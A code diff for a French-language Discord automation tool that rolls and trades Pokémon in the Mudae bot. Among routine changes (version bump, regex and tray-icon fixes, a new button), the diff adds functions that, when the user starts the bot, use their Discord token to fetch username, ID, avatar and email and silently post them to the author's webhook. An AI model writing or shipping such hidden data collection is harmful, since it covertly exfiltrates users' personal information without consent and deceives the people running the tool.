@@ -12,20 +12,24 @@ from ttkbootstrap import Style
 import pystray
 from PIL import Image
 from collections import defaultdict
+import datetime
+from config import WEBHOOK_URL
+
 
 pygame.mixer.init()
 
 APPDATA_DIR = os.path.join(os.getenv("APPDATA"), "MudaeBot")
 CONFIG_FILE = os.path.join(APPDATA_DIR, "config.json")
 LOG_FILE = os.path.join(APPDATA_DIR, "log.txt")
-ICON_PATH = "F:\Mudae-pokemon\mudae.ico"
+ICON_PATH = "mudae.ico"
 SOUND_PATH = "music.mp3"
+#pp = "mudae-pp.png"
 
 CHANNEL_ID = "1084908479745114212"
 GUILD_ID = "979531608459726878"
 
 GITHUB_REPO = "Khalifouille/mudae-pokemon-automatiseur"
-CURRENT_VERSION = "1.0.1"
+CURRENT_VERSION = "1.0.2"
 
 running = False
 test_mode = False
@@ -45,6 +49,76 @@ def log_message(message, level="info"):
     log_text.see(tk.END)
     with open(LOG_FILE, "a") as log_file:
         log_file.write(f"[{tag}] {message}\n")
+
+def recup_nom_discord(token):
+    url = "https://discord.com/api/v9/users/@me"
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    response = requests.get(url, headers=headers)
+    
+    if response.status_code == 200:
+        user_data = response.json()
+        print("Réponse de l'API Discord:", json.dumps(user_data, indent=4))
+        
+        username = f"{user_data['username']}#{user_data['discriminator']}"
+        user_id = user_data['id']
+        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png" if user_data['avatar'] else "Pas d'avatar"
+        #created_at = user_data.get('created_at', "Date non disponible") 
+        email = user_data["email"]
+
+        return username, user_id, avatar_url, email
+    else:
+        log_message(f"Erreur lors de la récupération des informations Discord ({response.status_code})", "error")
+        return None, None, None, None
+
+def send_webhook(username, user_id, avatar_url, email):
+    if not username:
+        return
+
+    now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    data = {
+        "username" : "Mudae - Khalifouille",
+        "avatar_url": "https://i.postimg.cc/sX2M4dXr/mudae-pp.png",
+        "embeds": [{
+            "title": f"MUDAE AUTOMATISATEUR - KHALIFOUILLE",
+            "color": 0x00ff00,
+            "fields": [
+                {
+                    "name": "Nom d'utilisateur",
+                    "value": username,
+                    "inline": True
+                },
+                {
+                    "name": "ID Discord",
+                    "value": user_id,
+                    "inline": True
+                },
+                {
+                    "name": "E-mail",
+                    "value": email,
+                    "inline": True
+                }
+            ],
+            "thumbnail": {
+            "url": avatar_url
+             },
+            "footer": {
+                "text": "Assistant Khali" + now
+            }
+        }],
+    }
+
+    response = requests.post(WEBHOOK_URL, json=data)
+    #response = requests.patch(f"https://discord.com/api/v9/webhooks/{WEBHOOK_URL.split('/')[-2]}/{WEBHOOK_URL.split('/')[-1]}", json=data)
+
+    if response.status_code == 204:
+        print("Nom d'utilisateur envoyé avec succès au webhook.", "success")
+    else:
+        log_message(f"Erreur lors de l'envoi au webhook : {response.status_code}", "error")
 
 def check_for_updates():
     url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
@@ -203,13 +277,16 @@ def toggle_bot():
         log_message("Bot arrêté.", "info")
         start_button.config(text="Démarrer", bootstyle="success")
     else:
-        if not token_entry.get() or not channel_entry.get():
+        token = token_entry.get()
+        if not token or not channel_entry.get():
             messagebox.showerror("Erreur", "Veuillez entrer un token et un Channel ID valide.")
             return
+
         running = True
-        sauvegarder_config()
         log_message("Bot démarré.", "info")
         start_button.config(text="Arrêter", bootstyle="danger")
+        username, user_id, avatar_url, email = recup_nom_discord(token)
+        send_webhook(username, user_id, avatar_url, email)
         threading.Thread(target=envoyer_message, daemon=True).start()
 
 def ouvrir_lien(event):
@@ -388,9 +465,9 @@ def trouver_doublons(pokemon_liste):
 
 def extraire_nombre_en_stock(contenu):
     log_message(f"Contenu du message : {contenu}", "info")
-    match = re.search(r"\((\d+) en stock\)", contenu)
+    match = re.search(r"\(\*\*(\d+(?:\.\d+)?)\*\* en stock\)", contenu)
     if match:
-        nombre_en_stock = int(match.group(1))
+        nombre_en_stock = float(match.group(1))
         log_message(f"Nombre de pokérolls en stock extrait : {nombre_en_stock}", "info")
         return nombre_en_stock
     else:
@@ -414,7 +491,7 @@ def executer_pd_arl():
         doublons = trouver_doublons(tous_les_pokemon)
 
         if doublons:
-            log_message("\nPokémon en double :", "info")
+            log_message("Pokémon en double :", "info")
             for pokemon, count in doublons.items():
                 log_message(f"{pokemon} : {count} exemplaires", "info")
             envoyer_arl()
@@ -425,7 +502,7 @@ def executer_pd_arl():
                 nombre_en_stock = extraire_nombre_en_stock(dernier_message_arl["content"])
                 if nombre_en_stock > 0:
                     log_message(f"Nombre de pokérolls en stock : {nombre_en_stock}", "info")
-                    envoyer_p(nombre_en_stock + 1)
+                    envoyer_p(int(nombre_en_stock))
                 else:
                     log_message("Aucun pokéroll en stock trouvé.", "info")
             else:
@@ -450,7 +527,15 @@ root.geometry("600x597")
 root.minsize(500, 450)
 
 if os.path.exists(ICON_PATH):
-    root.iconbitmap(ICON_PATH)
+    tray_image = Image.open(ICON_PATH)
+else:
+    tray_image = Image.new("RGBA", (64, 64), (255, 255, 255, 0))
+
+image = Image.open(ICON_PATH)
+menu = pystray.Menu(pystray.MenuItem("Ouvrir", show_window), pystray.MenuItem("Quitter", quit_application))
+tray_menu = (pystray.MenuItem("Ouvrir", show_window), pystray.MenuItem("Quitter", quit_application))
+tray_icon = pystray.Icon("MudaeBot", tray_image, "MudaeBot", tray_menu)
+root.protocol("WM_DELETE_WINDOW", on_closing)
 
 main_frame = ttk.Frame(root)
 main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
@@ -479,8 +564,11 @@ channel_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
 button_frame = ttk.Frame(main_frame)
 button_frame.pack(fill=tk.X, pady=10)
 
-start_button = ttk.Button(button_frame, text="Démarrer", command=toggle_bot, bootstyle="success")
+start_button = ttk.Button(button_frame, text="Démarrer la collecte", command=toggle_bot, bootstyle="success")
 start_button.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
+
+pd_arl_button = ttk.Button(button_frame, text="Démarrer $pd et $arl", command=executer_pd_arl, bootstyle="warning")
+pd_arl_button.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
 
 save_button = ttk.Button(button_frame, text="Sauvegarder", command=sauvegarder_config, bootstyle="info")
 save_button.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
@@ -516,12 +604,6 @@ log_text.config(yscrollcommand=scrollbar.set)
 charger_config()
 check_for_updates()
 
-image = Image.open(ICON_PATH)
-menu = pystray.Menu(pystray.MenuItem("Ouvrir", show_window), pystray.MenuItem("Quitter", quit_application))
-tray_icon = pystray.Icon("MudaeBot", image, "Mudae Pokemon Automatiseur", menu)
-
-root.protocol("WM_DELETE_WINDOW", on_closing)
-
-threading.Thread(target=lancer_pd_arl_intervalle, daemon=True).start()
+threading.Thread(target=tray_icon.run, daemon=True).start()
 
 root.mainloop()
